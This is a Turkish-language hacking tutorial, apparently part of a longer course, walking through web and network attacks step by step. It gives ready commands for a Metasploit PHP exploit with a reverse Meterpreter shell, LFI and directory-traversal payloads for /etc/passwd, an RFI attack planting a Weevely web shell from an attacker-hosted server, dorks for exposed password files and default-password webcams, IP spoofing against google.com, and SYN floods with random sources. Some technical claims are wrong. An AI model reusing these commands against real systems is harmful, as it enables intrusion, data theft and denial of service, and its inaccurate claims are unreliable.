+5. Adım: Web uygulamasındaki güvenlik zafiyetlerini tespit etmek için, Metasploit ile zafiyet tespiti yapın. Metasploit, Metasploit Framework adlı bir betik motoru ile birlikte gelir. Metasploit Framework, Ruby programlama dili ile yazılmış betikleri çalıştırarak Metasploit'in işlevselliğini genişletir. Metasploit Framework, web uygulamalarındaki çeşitli güvenlik zafiyetlerini tespit etmek için kullanılabilir. Örneğin, aşağıdaki komutu kullanarak web uygulamasındaki XSS zafiyetlerini tespit edebilirsiniz:
+msfconsole
+use auxiliary/scanner/http/http_header
+set RHOSTS testphp.vulnweb.com
+set HEADER_NAME X-XSS-Protection
+set HEADER_VALUE 0
+run
+Bu komut, web uygulamasının XSS zafiyetlerine sahip olduğunu ve bu zafiyetleri istismar etmek için X-XSS-Protection başlığını devre dışı bırakabileceğinizi gösterecektir.
+6. Adım: Web uygulamasındaki güvenlik zafiyetlerini istismar etmek için, Metasploit ile istismar modüllerini kullanın. Metasploit, web uygulamalarındaki çeşitli güvenlik zafiyetlerini istismar etmek için hazır modüller sunar. Örneğin, aşağıdaki komutu kullanarak web uygulamasındaki PHP kod enjeksiyonu zafiyetini istismar edebilirsiniz:
+msfconsole
+use exploit/multi/http/php_eval
+set RHOSTS testphp.vulnweb.com
+set RPORT 80
+set PATH /art.php
+set POSTDATA "id=1&artist=1&title=1&content=1&cmd="
+set PAYLOAD php/meterpreter/reverse_tcp
+set LHOST <your IP address>
+set LPORT <your port number>
+exploit
+Bu komut, web uygulamasına bir ters bağlantı kuracak ve size bir Meterpreter oturumu verecektir. Meterpreter, hedef sistemde komut çalıştırmanızı, dosya indirip yüklemenizi, ekran görüntüsü almanızı, klavye tuş vuruşlarını kaydetmenizi ve daha fazlasını yapmanızı sağlayan gelişmiş bir kabuktur.
+Bu şekilde, Metasploit kullanarak web uygulamalarındaki güvenlik zafiyetlerini tespit etmek, test etmek ve istismar etmek mümkündür.
+OWASP ZAP Kullanarak Veri Manipulasyonu
+OWASP ZAP, web uygulamalarını güvenlik açısından tarayan ve zafiyetleri bulan ücretsiz ve açık kaynaklı bir araçtır. OWASP ZAP ile web uygulamalarını manuel veya otomatik olarak test edebilir, proxy olarak kullanabilir, eklentilerle özelleştirebilir ve genişletebilirsiniz. OWASP ZAP, Linux, Windows, macOS ve Docker gibi farklı platformlarda çalışabilir. OWASP ZAP'in resmi web sitesi zaproxy.org adresindedir.
+OWASP ZAP kullanmak için aşağıdaki adımları izleyebilirsiniz:
+1. Adım: OWASP ZAP'i kurmak için, zaproxy.org adresinden indirin ve kurulum talimatlarını takip edin. OWASP ZAP'i komut satırından veya grafiksel kullanıcı arayüzünden çalıştırabilirsiniz. Grafiksel kullanıcı arayüzü, OWASP ZAP'in tüm özelliklerine erişmenizi sağlar.
+2. Adım: Test etmek istediğiniz web uygulamasının IP adresini veya alan adını belirleyin. Örneğin, testphp.vulnweb.com adresindeki web uygulamasını test edelim. Bu web uygulamasının IP adresi 176.28.50.165'tir.
+3. Adım: Web uygulamasına OWASP ZAP ile bağlanmak için, OWASP ZAP'i proxy olarak ayarlayın. OWASP ZAP, varsayılan olarak 8080 numaralı portta çalışır. Bu portu değiştirebilir veya aynı kalmaya devam edebilirsiniz. OWASP ZAP'in ayarlar menüsünden proxy ayarlarını yapabilirsiniz. Daha sonra, web tarayıcınızın proxy ayarlarını OWASP ZAP'in proxy ayarlarıyla aynı yapın. Böylece, web uygulamasına gönderdiğiniz ve aldığınız tüm istek ve yanıtları OWASP ZAP ile görebilir ve değiştirebilirsiniz.
+4. Adım: Web uygulamasının hangi portlarda hangi servisleri çalıştırdığını tespit etmek için, OWASP ZAP ile port taraması yapın. OWASP ZAP, web uygulamasının açık portlarını ve çalışan servislerini otomatik olarak tespit eder. Port taraması sonuçlarını OWASP ZAP'in arayüzünden görebilirsiniz. Ayrıca, OWASP ZAP ile web uygulamasının SSL sertifikasını, işletim sistemini, sunucu yazılımını, çerezlerini ve diğer bilgilerini de öğrenebilirsiniz.
+5. Adım: Web uygulamasındaki güvenlik zafiyetlerini tespit etmek için, OWASP ZAP ile zafiyet taraması yapın. OWASP ZAP, web uygulamasındaki XSS, SQLi, CSRF, LFI, RFI, OS Command Injection, Path Traversal, Directory Listing, Insecure HTTP Methods, Heartbleed, Shellshock, Poodle, HSTS, HPKP, CSP, CORS gibi çeşitli güvenlik zafiyetlerini tespit edebilir. Zafiyet taraması yapmak için, OWASP ZAP'in arayüzünden Attack menüsünü seçin ve Active Scan veya Spider seçeneklerini kullanın. Active Scan, web uygulamasına saldırı vektörleri göndererek zafiyetleri bulur. Spider, web uygulamasının tüm sayfalarını tarayarak zafiyetleri bulur. Zafiyet taraması sonuçlarını OWASP ZAP'in arayüzünden görebilirsiniz. Ayrıca, OWASP ZAP ile zafiyetleri manuel olarak da test edebilir, istek ve yanıtları değiştirebilir, tekrar gönderebilir veya kırabilirsiniz.
+Bu şekilde, OWASP ZAP kullanarak web uygulamalarındaki güvenlik zafiyetlerini tespit etmek ve test etmek mümkündür. 
+Burp Proxy Kullanarak Web Güvenlik Testleri
+Burp Proxy, web uygulamalarının zafiyetlerini tespit etmek ve istismar etmek için kullanılan bir araçtır. Burp Proxy ile web trafiğini yakalayabilir, değiştirebilir ve tekrar gönderebilirsiniz. Burp Proxy'nin farklı eklentileri vardır. Bunlardan biri Intruder, diğeri ise SQLMap'dir. Intruder, HTTP isteklerine farklı değerler enjekte ederek brute force saldırıları yapmanızı sağlar. SQLMap ise SQL enjeksiyon zafiyetlerini otomatik olarak bulup veritabanına erişmenizi sağlar.
+Burp Proxy kullanarak local file inclusion (LFI) açıklığı ile index.php dosyasını okumak için aşağıdaki adımları izleyebilirsiniz:
+1. Adım: Mutillidae web uygulamasını indirip kurun. Mutillidae, web güvenlik testleri için hazırlanmış zafiyetli bir uygulamadır.
+2. Adım: Web tarayıcınızın proxy ayarlarını localhost:8080 olarak değiştirin. Böylece web trafiği Burp Proxy üzerinden geçecektir.
+3. Adım: Burp Suite'i çalıştırın ve Proxy > Intercept sekmesine gidin. Intercept is on butonuna tıklayın. Böylece web trafiğini yakalamaya başlayacaksınız.
+4. Adım: Web tarayıcınızda Mutillidae uygulamasını açın ve File Inclusion > File Text Viewer menüsüne gidin. Bu menü, LFI açıklığı içeren bir menüdür.
+5. Adım: Bu menüde, textfile parametresine istediğiniz bir dosya adı girin ve View File butonuna tıklayın. Örneğin, /etc/passwd dosyasını girip View File butonuna tıklayabilirsiniz.
+6. Adım: Bu işlemi yaptığınızda, web trafiği Burp Proxy tarafından yakalanacaktır. Proxy > Intercept sekmesine gidip yakalanan HTTP isteğini görebilirsiniz. Bu istekte, textfile parametresinin değerini index.php olarak değiştirip sağ tıklayın ve Send to Repeater seçeneğini seçin. Böylece isteği tekrar göndermek için Repeater eklentisine aktarmış olacaksınız.
+7. Adım: Repeater sekmesine gidin ve Go butonuna tıklayın. Böylece sunucuya index.php dosyasını isteyen bir HTTP isteği göndermiş olacaksınız. Sunucudan gelen cevabı Response bölümünde görebilirsiniz. Bu cevapta, index.php dosyasının içeriğini okuyabilirsiniz. Böylece LFI açıklığını kullanarak local dosyayı okumuş olursunuz.
+LFI(Local File Inclusion) Kullanarak Dosya Okuma
+LFI, bir web uygulamasının yerel dosyaları dahil etmesine izin veren bir güvenlik açığıdır. Bu sayede, saldırgan sunucudaki hassas dosyalara erişebilir veya çalıştırabilir. LFI saldırısı yapmak için, genellikle URL parametreleri veya form girişleri yoluyla, dosya yolu veya içeriği etkileyen veriler gönderilir.
+Linux sunucularda, /etc/passwd dosyası, kullanıcı hesaplarının bilgilerini içerir. Bu dosyayı okumak, saldırganın sunucudaki kullanıcı adlarını, parolalarını, gruplarını veya diğer ayrıntılarını öğrenmesine olanak tanır. Bu nedenle, LFI saldırısında sıkça hedef alınan bir dosyadır.
+LFI saldırısı yapmak için kullanılan araçlardan biri, Burp Suite adlı bir web güvenlik testi aracıdır. Burp Suite, web trafiğini yakalayıp değiştirmeye, web uygulamalarının zayıflıklarını tespit etmeye ve otomatik saldırılar gerçekleştirmeye yarayan birçok modüle sahiptir. Burp Suite ile LFI saldırısı yapmak için, aşağıdaki adımları izleyebilirsiniz:
+1. Adım: LFI açığı bulunan bir web uygulamasına erişin. Örneğin, Mutillidae adlı bir web uygulama zafiyet test platformunu kullanabilirsiniz. Mutillidae, LFI açığı bulunan birçok sayfaya sahiptir.
+2. Adım: Burp Suite'i çalıştırın ve proxy ayarlarını yapılandırın. Burp Suite'in proxy modülü, web trafiğini yakalamak ve değiştirmek için kullanılır. Proxy ayarlarını, Burp Suite'in proxy sekmesindeki options sekmesinden yapabilirsiniz. Genellikle, Burp Suite'in proxy adresi 127.0.0.1 ve portu 8080'dir. Bu ayarları, kullandığınız web tarayıcısının proxy ayarlarına da uygulamalısınız.
+3. Adım: Burp Suite'in proxy sekmesindeki intercept sekmesinde, intercept is on seçeneğini aktif hale getirin. Bu sayede, web tarayıcınızdan gönderdiğiniz veya aldığınız istekler Burp Suite tarafından yakalanacaktır.
+4. Adım: Web uygulamasında, LFI açığı bulunan bir sayfaya gidin ve dosya görüntüleme işlemi yapın. Örneğin, Mutillidae'de, File Inclusion > Show File Source Code bölümünü seçebilirsiniz. Bu bölümde, bir dosya adı girerek, dosyanın kaynak kodunu görüntüleyebilirsiniz. Burada, herhangi bir dosya adı girin ve View File butonuna tıklayın.
+5. Adım: Burp Suite'in proxy sekmesindeki intercept sekmesinde, yakalanan isteği inceleyin. Bu istekte, dosya adının geçtiği bir parametre bulunacaktır. Örneğin, Mutillidae'de, bu parametre file_inclusion.php'dir. Bu parametreyi, ../../../../../../etc/passwd şeklinde değiştirin. Bu, sunucunun root dizinine ulaşmak için bir önceki dizine geçme işlemini tekrarlar. Sonra, forward butonuna tıklayarak, isteği gönderin.
+6. Adım: Web tarayıcınızda, sunucunun /etc/passwd dosyasının içeriğini görüntüleyin. Bu, LFI saldırısının başarılı olduğunu gösterir.
+Bu şekilde, LFI kullanarak dosya okuma işlemi yapabilirsiniz. 
+RFI Kullanarak Sisteme Zararlı Yazılım Yükleme
+RFI (Remote File Inclusion) kullanarak sisteme zararlı yazılım yükleme, web uygulamalarının güvenlik açıklarını istismar ederek, uzak bir sunucudan kötü amaçlı bir dosyayı dahil etmek ve çalıştırmak anlamına gelir. Bu şekilde, saldırgan hedef sunucuyu ele geçirebilir, verileri çalabilir, komutlar çalıştırabilir veya başka saldırılar gerçekleştirebilir.
+RFI saldırısı yapmak için, saldırganın aşağıdaki şartları sağlaması gerekir:
+- Hedef web sunucusu, kullanıcı girdisini doğrulamadan veya filtrelemeden dahil etme fonksiyonları (örneğin, PHP'de include, require, fopen vb.) kullanmalıdır.
+- Saldırganın, hedef web sunucusuna erişebileceği ve kötü amaçlı dosyayı barındırabileceği bir uzak sunucuya sahip olması gerekir.
+Aşağıda, RFI saldırısı yapmak için kullanabileceğiniz güncel bilgiler ve adımlar bulunmaktadır.
+Kullanılan Araçlar:
+- DVWA (Damn Vulnerable Web Application): Güvenlik açıklarını test etmek için tasarlanmış bir web uygulamasıdır.
+- Weevely: PHP tabanlı bir web kabuğu ve arka kapı aracıdır. Kötü amaçlı dosya olarak kullanacağımız scripti oluşturmak için kullanacağız.
+Adımlar:
+1. Adım: DVWA üzerinde File Inclusion zafiyetini açmak için, DVWA Security bölümünden Security Level'i Low olarak ayarlayın. Ardından, File Inclusion bölümüne gidin. Burada, bir dosya adı girmenizi isteyen bir kutu göreceksiniz. Bu kutu, kullanıcı girdisini doğrulamadan include fonksiyonunu kullanan bir PHP kodunu çalıştırmaktadır. Bu, RFI saldırısı için bir açık oluşturmaktadır.
+2. Adım: Weevely ile bir web kabuğu oluşturmak için, terminalde aşağıdaki komutu çalıştırın. Burada, shell.php dosya adı, password ise web kabuğuna erişmek için kullanacağımız paroladır. Bu komut, shell.php dosyasını oluşturacaktır.
+weevely generate password shell.php
+3. Adım: Oluşturduğumuz shell.php dosyasını, DVWA sunucusuna erişebileceğimiz bir uzak sunucuya yükleyelim. Bunun için, bir FTP sunucusu veya bir web sunucusu kullanabiliriz. Örneğin, shell.php dosyasını /var/www/html dizinine kopyalayarak, http://192.168.1.102/shell.php adresinden erişilebilir hale getirebiliriz.
+4. Adım: DVWA üzerindeki File Inclusion kutusuna, uzak sunucudaki shell.php dosyasının adresini girerek, RFI saldırısını gerçekleştirelim. Bu, DVWA sunucusunda shell.php dosyasını çalıştıracak ve web kabuğunu aktif hale getirecektir. Kutuya aşağıdaki değeri girip Submit butonuna tıklayalım.
+php
+http://192.168.1.102/shell.php
+5. Adım: Artık DVWA sunucusu üzerinde komutlar çalıştırmaya başlayabiliriz. Bunun için, Weevely ile web kabuğuna bağlanmak üzere, terminalde aşağıdaki komutu çalıştıralım. Burada, http://192.168.1.101/vulnerabilities/fi/?page=http://192.168.1.102/shell.php adresi, DVWA sunucusundaki File Inclusion kutusunun çalıştırdığı PHP kodunun adresidir. Password ise, web kabuğunu oluştururken kullandığımız paroladır.
+weevely http://192.168.1.101/vulnerabilities/fi/?page=http://192.168.1.102/shell.php password
+Bu komut, bizi web kabuğuna bağlayacak ve DVWA sunucusunda komut çalıştırabileceğimiz bir arayüz sunacaktır. Örneğin, DVWA sunucusunun işletim sistemi, kullanıcı adı ve çalışma dizini gibi bilgileri almak için aşağıdaki komutu çalıştırabiliriz.
+:system.info
+Bu şekilde, RFI saldırısı yaparak, DVWA sunucusunu ele geçirmiş oluruz. Bu saldırıyı önlemek için, web uygulamalarının kullanıcı girdilerini doğrulaması ve filtrelemesi ve sadece güvenli kaynaklardan dosya dahil etmesi gerekir.
+Directory Treversal Açıklığı Kullanarak Sistem Gezinimi 
+Directory traversal açıklığı, bir web uygulamasının güvenli olmayan bir şekilde dosya okuma veya yazma işlemleri gerçekleştirmesine izin veren bir güvenlik zafiyetidir. Bu zafiyet, saldırganların web sunucusunun normalde erişilemeyen dosya ve klasörlerine ulaşmasına olanak tanır. Bu, saldırganların sunucunun gizli bilgilerini ele geçirmesine veya sistemi bozmasına neden olabilir.
+Directory traversal açıklığı olan bir sunucuda sistem gezinimi yapmak için, sunucunun aldığı dosya adı parametresini manipüle etmek gerekir. Bu parametre, sunucunun hangi dosyayı okuyacağını veya yazacağını belirler. Bu parametreyi değiştirerek, sunucunun web klasörü dışındaki farklı dosya ve klasörlere erişmesini sağlayabilirsiniz. Bunun için, aşağıdaki adımları takip edebilirsiniz:
+1. Adım: Öncelikle, sunucunun hangi parametrenin dosya adını belirlediğini bulmanız gerekir. Bu parametre, genellikle web sayfasının URL'sinde görünür. Örneğin, bir resim yükleme sayfasının URL'si şöyle olabilir: https://vulnerable-website.com/loadImage?filename=218.png Burada filename parametresi, sunucunun yükleyeceği resmin adını belirtir. Bu parametreyi değiştirerek, sunucunun farklı resimleri yüklemesini sağlayabilirsiniz. Eğer sunucu, filename parametresine ../ veya ..\\ gibi dizin geçiş dizilerini kabul ediyorsa, bu bir directory traversal açığı olduğunu gösterir. Bu diziler, sunucunun bir üst dizine çıkmasını sağlar. Örneğin, filename=../images/219.png parametresi, sunucunun /var/www/images/images/219.png dosyasını yüklemesine neden olur.
+2. Adım: İkinci olarak, sunucunun /etc/ klasörüne erişmesini sağlayabilirsiniz. Bu klasör, sunucunun yapılandırma dosyalarını içerir. Bu dosyalar, sunucunun çalışma şeklini belirler ve gizli bilgiler içerebilir. Bu klasöre erişmek için, filename parametresine ../ veya ..\\ dizilerini ekleyerek, web klasöründen çıkmanız gerekir. Örneğin, filename=../../../etc/passwd parametresi, sunucunun /var/www/images/../../../etc/passwd dosyasını yüklemesine neden olur. Bu, /etc/passwd dosyasının yoludur. Bu dosya, sunucunun kullanıcı hesaplarını ve şifrelerini içerir. Bu dosyayı okuyarak, sunucunun kullanıcı adlarını ve şifrelerini öğrenebilirsiniz.
+3. Adım: Üçüncü olarak, sunucunun /var/log klasörüne erişmesini sağlayabilirsiniz. Bu klasör, sunucunun log dosyalarını içerir. Bu dosyalar, sunucunun faaliyetlerini kaydeder ve hata mesajları içerebilir. Bu klasöre erişmek için, filename parametresine /var/log klasörüne ulaşacak şekilde ../ veya ..\\ dizileri ekleyin ve ardından istediğiniz log dosyasının adını yazın. Örneğin, filename=../../var/log/auth.log parametresi, sunucunun /var/www/images/../../var/log/auth.log dosyasını yüklemesine neden olur. Bu dosya, sunucuya kimlik doğrulaması yapan kullanıcıların kaydını tutar. Bu dosyayı okuyarak, sunucuya giriş yapan kullanıcıların IP adreslerini, zamanlarını ve diğer bilgilerini öğrenebilirsiniz.
+4. Adım: Dördüncü olarak, sunucunun /etc/hosts dosyasına erişmesini sağlayabilirsiniz. Bu dosya, sunucunun IP adresleri ve etki alanı adları arasındaki eşlemeleri içerir. Bu dosyayı okuyarak, sunucunun ağ bilgilerini öğrenebilirsiniz. Bu dosyaya erişmek için, filename parametresine /etc/hosts dosyasına ulaşacak şekilde ../ veya ..\\ dizileri ekleyin. Örneğin, filename=../../../etc/hosts parametresi, sunucunun /var/www/images/../../../etc/hosts dosyasını yüklemesine neden olur.
+5. Adım: Son olarak, sunucunun /etc/resolv.conf dosyasına erişmesini sağlayabilirsiniz. Bu dosya, sunucunun DNS sunucularını ve diğer DNS ayarlarını içerir. Bu dosyayı okuyarak, sunucunun DNS bilgilerini öğrenebilirsiniz. Bu dosyaya erişmek için, filename parametresine /etc/resolv.conf dosyasına ulaşacak şekilde ../ veya ..\\ dizileri ekleyin. Örneğin, filename=../../../etc/resolv.conf parametresi, sunucunun /var/www/images/../../../etc/resolv.conf dosyasını yüklemesine neden olur.
+Bu adımları izleyerek, directory traversal açıklığı olan bir sunucuda sistem gezinimi yapabilir ve hassas dosyaları okuyabilirsiniz.
+Web Güvenlik Testleri için Örnek Online Uygulamalar
+Web güvenlik testleri, web sitelerinin ve uygulamalarının güvenlik açıklarını bulmak ve düzeltmek için kullanılan bir yöntemdir. Web güvenlik testleri yapmak için çeşitli online araçlar ve yöntemler vardır. İşte bunlardan bazıları:
+1. Adım: Hackertarget.com isimli web sitesi, web sitelerinin ve uygulamalarının güvenlik açıklarını online olarak test etmenizi sağlayan bir araçtır. Bu araç, DNS, IP, WHOIS, NMAP, Traceroute, Ping, SSL, Firewall, HTTP Header, WordPress gibi çeşitli testler sunmaktadır. Bu araç ücretsiz olarak kullanılabilir, ancak sınırlı sayıda test yapabilirsiniz. Ücretli üyelik alarak daha fazla test yapabilir ve rapor alabilirsiniz.
+2. Adım: Exploit-db.com üzerinden google-dorks menüsünde, web sitelerinin ve uygulamalarının güvenlik açıklarını içeren açıklıkların bulunması için ilgili google arama yöntemleri bulabilirsiniz. Google-dorks, Google'ın gelişmiş arama özelliklerini kullanarak hassas bilgileri, güvenlik açıklarını veya hataları bulmaya yarayan arama terimleridir. Örneğin, intitle:"index of" password.txt araması, başlığında "index of" olan ve password.txt dosyasını içeren web sitelerini bulur.
+3. Adım: ShodanHQ üzerinden çeşitli güvenlik zaafiyetleri bulabilirsiniz. ShodanHQ, internete bağlı cihazları, sunucuları, web kameralarını, yazıcıları, routerları, IoT cihazlarını vb. aramanızı sağlayan bir arama motorudur. Bu arama motoru, cihazların IP adreslerini, konumlarını, işletim sistemlerini, portlarını, servislerini, bannerlarını, protokollerini vb. gösterir. Bu bilgiler, cihazların güvenlik durumunu değerlendirmek için kullanılabilir. Örneğin, default password webcam country:TR araması, Türkiye'de bulunan ve varsayılan şifre kullanan web kamerlarını bulur.
+4. Adım: Google.com üzerinden web uygulama güvenlik testlerinde kullanılabilecek hassas bilgileri bulabilirsiniz. Google, web sitelerinin içeriğini indekslerken, bazen kullanıcı adları, şifreler, e-posta adresleri, telefon numaraları, kredi kartı numaraları gibi hassas bilgileri de indeksleyebilir. Bu bilgiler, web sitelerinin güvenliğini test etmek veya saldırmak için kullanılabilir. Örneğin, filetype:xls "username | password" site:fr araması, Fransa'da bulunan ve kullanıcı adı veya şifre içeren xls dosyalarını bulur.
+5. Adım: Testasp.vulnweb.com üzerinde çeşitli web güvenlik zaafiyetleri içeren Acunetix firmasına ait bir web uygulamasıdır. Bu web uygulaması, web güvenlik testleri yapmak için kullanılabilecek bir test ortamı sunmaktadır. Üzerinde SQL injection, XSS, LFI, RFI, Command Injection, Directory Traversal, File Inclusion gibi güvenlik açıkları bulunabilir. Bu açıklar, web uygulamasının veritabanına, dosya sistemine, işletim sistemine erişmek veya kod çalıştırmak için kullanılabilir.
+W3Af Kullanarak Otomatize Güvenlik Testleri
+W3af, web uygulamalarının güvenlik açıklarını bulmak ve istismar etmek için kullanılan açık kaynaklı bir araçtır. W3af, farklı eklentileri bir araya getirerek kendi test profillerinizi oluşturmanıza olanak sağlar. W3af, hem grafiksel arayüz (GUI) hem de komut satırı arayüzü (CLI) ile çalıştırılabilir.
+Kali Linux, web güvenlik testleri için en popüler Linux dağıtımlarından biridir.  Kali Linux, W3af dahil olmak üzere birçok güvenlik aracını içerir. Kali Linux'u farklı şekillerde çalıştırabilirsiniz. Örneğin, sanal makine, canlı önyükleme, WSL, konteyner veya kurulum dosyası. Hangi yöntemi seçerseniz seçin, Kali Linux'u çalıştırdıktan sonra W3af aracını kullanmaya başlayabilirsiniz.
+W3af aracını kullanarak web güvenlik testleri yapmak için aşağıdaki adımları izleyin:
+1. Adım: W3af aracını başlatmak için Kali Linux terminalinde w3af komutunu yazın. GUI modunda çalıştırmak için w3af_gui komutunu kullanın. Bu adımda W3af aracının güncel olup olmadığını kontrol edebilirsiniz. Güncellemek için w3af_console -update komutunu kullanın.
+2. Adım: Hedef web uygulamasının adresini Target sekmesindeki URL kutusuna yazın. Sol taraftaki menüden istediğiniz bir profil seçin. Örneğin, OWASP tarafından belirlenen en yaygın 10 web güvenlik açığı için hazırlanmış olan OWASP_TOP10 profili. Kendi profilinizi oluşturmak için Plugins sekmesindeki eklentileri seçebilirsiniz. Eklentiler, keşif, denetim, saldırı, bruteforce, grep, mangle, output, auth ve evasion olmak üzere 9 kategoride yer alır.
+3. Adım: Start sekmesine tıklayarak taramayı başlatın. Discovering aşamasında W3af, web uygulamasının yapısını ve parametrelerini belirlemek için web spider işlemi gerçekleştirir. Bu aşamada hedef web uygulamasının alt dizinleri, formları, yorumları, çerezleri, başlıkları ve diğer bilgileri toplanır.
+4. Adım: Log sekmesine tıklayarak tarama sonuçlarını görüntüleyin. Kırmızı ile işaretli bölümler yüksek seviye güvenlik açıklarını gösterir. Örneğin, SQL enjeksiyonu, XSS, komut enjeksiyonu, dosya yükleme, dosya içeriği, vb. Bu bölümlerde açıklığın detayları, etkilenen URL'ler, istek ve yanıt verileri, çözüm önerileri ve kaynaklar yer alır.
+5. Adım: Exploit sekmesine tıklayarak ilgili açıklığı istismar edebilirsiniz. Örneğin, SQL enjeksiyonu seçerek sqlmap ile exploit edip veritabanı ve tüm verileri elde edebilirsiniz. Webshell sisteme atılarak uzaktan yönetilebilir. Exploit sekmesindeki eklentiler, hedef web uygulamasının zafiyetlerine göre farklılık gösterir.
+Bu şekilde W3af aracını kullanarak web güvenlik testleri yapabilirsiniz.
+Sahte IP Paketleri Oluşturma (IP Spoofing)
+IP spoofing, bir bilgisayarın başka bir bilgisayarın IP adresini taklit etmesi veya gizlemesi için IP paketlerinin kaynak adresini değiştirmek demektir. Bu, ağ güvenliğini atlatmak, DDoS saldırıları yapmak veya başka bir cihazı taklit etmek için kullanılabilir. IP spoofing yapmak için hping3 gibi bir araç kullanabilirsiniz. hping3, özel ICMP/UDP/TCP paketleri oluşturmak ve göndermek için bir komut satırı aracıdır. hping3 ile farklı ağ trafiği türlerini simüle edebilir, ağ testi ve sorun giderme yapabilirsiniz.
+hping3 kullanarak IP spoofing yapmak için aşağıdaki adımları izleyebilirsiniz:
+1. Adım: hping3'i Linux sisteminize kurun. Dağıtımınıza bağlı olarak farklı kurulum yöntemleri olabilir. Örneğin, Debian/Ubuntu tabanlı sistemlerde şu komutu kullanabilirsiniz:
+sudo apt-get install hping3
+2. Adım: hping3 ile SYN bayrağı set edilmiş TCP paketleri göndermek için -S seçeneğini kullanın. SYN bayrağı, bir TCP bağlantısının başlatılmasını istediğinizi belirtir. Hedef IP adresini veya alan adını belirtmek için -p seçeneğini kullanın. Sahte IP adresi belirtmek için --spoof veya -a seçeneğini kullanın. Göndermek istediğiniz paket sayısını belirtmek için -c seçeneğini kullanın. Örneğin, 5.5.5.5 IP adresinden google.com'a 80 portuna 10 adet SYN paketi göndermek için şu komutu kullanabilirsiniz:
+sudo hping3 -S google.com -p 80 --spoof 5.5.5.5 -c 10
+3. Adım: Gönderdiğiniz ve aldığınız paketleri izlemek için tcpdump aracını kullanın. tcpdump, ağ trafiğini yakalamak ve analiz etmek için bir komut satırı aracıdır. tcpdump ile belirli bir IP adresine veya port numarasına gelen veya giden paketleri filtreleyebilirsiniz. tcpdump'i Linux sisteminize kurmak için dağıtımınıza bağlı olarak farklı kurulum yöntemleri olabilir. Örneğin, Debian/Ubuntu tabanlı sistemlerde şu komutu kullanabilirsiniz:
+sudo apt-get install tcpdump
+4. Adım: tcpdump ile hedef IP adresine giden veya gelen paketleri izlemek için -nn -tt host seçeneklerini kullanın. -nn seçeneği, IP adreslerini ve port numaralarını sayısal olarak gösterir. -tt seçeneği, zaman damgalarını saniye cinsinden gösterir. host seçeneği, izlemek istediğiniz IP adresini veya alan adını belirtir. Örneğin, google.com'a giden veya gelen paketleri izlemek için şu komutu kullanabilirsiniz:
+sudo tcpdump -nn -tt host google.com
+5. Adım: hping3 ve tcpdump araçlarını aynı anda çalıştırmak için iki terminal penceresi açın. Birinde hping3 komutunu, diğerinde tcpdump komutunu çalıştırın. Böylece, sahte IP adresinden gönderdiğiniz SYN paketlerini ve hedef sunucudan gelen SYN-ACK paketlerini görebilirsiniz. SYN-ACK paketleri, TCP bağlantısının kabul edildiğini belirtir. Ancak, bu paketler sahte IP adresine gideceği için, sizin bilgisayarınız bunları almayacaktır. Bu, IP spoofing'in bir sonucudur.
+6. Adım: IP spoofing yaparken, ağ trafiğini izlemek ve analiz etmek için Wireshark gibi bir grafiksel arayüz aracı da kullanabilirsiniz. Wireshark, ağ trafiğini yakalamak, filtrelemek ve görselleştirmek için bir araçtır. Wireshark'ı Linux sisteminize kurmak için dağıtımınıza bağlı olarak farklı kurulum yöntemleri olabilir. Örneğin, Debian/Ubuntu tabanlı sistemlerde şu komutu kullanabilirsiniz:
+sudo apt-get install wireshark
+SYN Flood Saldırısı Gerçekleştirme
+SYN Flood saldırısı, bir sunucunun TCP bağlantı kurma yeteneğini kötüye kullanarak hizmet dışı bırakmayı amaçlayan bir saldırı türüdür. Bu saldırıda, saldırgan sunucuya çok sayıda SYN paketi gönderir, ancak sunucunun gönderdiği SYN-ACK paketlerine karşılık vermez. Böylece, sunucu yarı açık bağlantılarla dolu olur ve yeni bağlantı taleplerini işleyemez.
+SYN Flood saldırısı gerçekleştirmek için kullanabileceğiniz bazı araçlar şunlardır:
+- Hping3: Bir ağ test aracıdır. TCP, UDP, ICMP ve RAW-IP protokollerini destekler. SYN paketleri göndermek için -S seçeneğini kullanabilirsiniz.
+- Mz: Bir paket oluşturma ve enjeksiyon aracıdır. TCP, UDP, ICMP, ARP, IP ve Ethernet protokollerini destekler. SYN paketleri göndermek için flags=syn seçeneğini kullanabilirsiniz.
+- Juno: Bir SYN Flood saldırısı simülasyon aracıdır. SYN paketleri göndermek için -s seçeneğini kullanabilirsiniz.
+- Netstat: Bir ağ istatistikleri aracıdır. Bağlantı durumlarını görmek için -a seçeneğini kullanabilirsiniz.
+Bu araçları kullanarak SYN Flood saldırısı gerçekleştirmek için aşağıdaki adımları izleyebilirsiniz:
+1. Adım: Hping3 ile gerçek IP adresinden SYN Flood saldırısı gerçekleştirelim. Örneğin, hedef sunucunun IP adresi 192.168.1.1 ve portu 80 olsun. Bu durumda, aşağıdaki komutu kullanabilirsiniz:
+root@bt:~# hping3 -S 192.168.1.1 -p 80 --flood
+Bu komut, hedef sunucuya SYN bayrağı set edilmiş TCP paketleri gönderir. --flood seçeneği, paketleri mümkün olan en hızlı şekilde gönderir. Bu seçeneği kullanmak yerine, -i u0 seçeneğini de kullanabilirsiniz. Bu seçenek, her paket arasında 0 mikrosaniye bekleme süresi belirtir.
+2. Adım: Mz ile gerçek IP adresinden SYN Flood saldırısı gerçekleştirelim. Önceki örneği kullanarak, aşağıdaki komutu kullanabilirsiniz:
+root@bt:~# mz eth0 -c 0 -B 192.168.1.1 -t tcp "flags=syn, dp=80, sp=1-65535"
+Bu komut, eth0 arayüzünden hedef sunucuya SYN bayrağı set edilmiş TCP paketleri gönderir. -c 0 seçeneği, sonsuz sayıda paket gönderir. -B seçeneği, hedef IP adresini belirtir. -t seçeneği, TCP protokolünü belirtir. flags=syn seçeneği, SYN bayrağını set eder. dp=80 seçeneği, hedef portu belirtir. sp=1-65535 seçeneği, kaynak portunu rastgele seçer.
+3. Adım: Hping3 ile rastgele kaynak IP adreslerinden SYN Flood saldırısı gerçekleştirelim. Bu şekilde, saldırının kaynağını gizleyebilirsiniz. Önceki örneği kullanarak, aşağıdaki komutu kullanabilirsiniz:
+root@bt:~# hping3 -S 192.168.1.1 -p 80 --flood --rand-source
+Bu komut, hedef sunucuya SYN bayrağı set edilmiş TCP paketleri gönderir. --rand-source seçeneği, kaynak IP adresini rastgele seçer.
+4. Adım: Mz ile rastgele kaynak IP adreslerinden SYN Flood saldırısı gerçekleştirelim. Önceki örneği kullanarak, aşağıdaki komutu kullanabilirsiniz:
+root@bt:~# mz eth0 -c 0 -A rand -B 192.168.1.1 -t tcp "flags=syn, dp=80, sp=1-65535"
+Bu komut, eth0 arayüzünden hedef sunucuya SYN bayrağı set edilmiş TCP paketleri gönderir. -A rand seçeneği, kaynak IP adresini rastgele seçer.
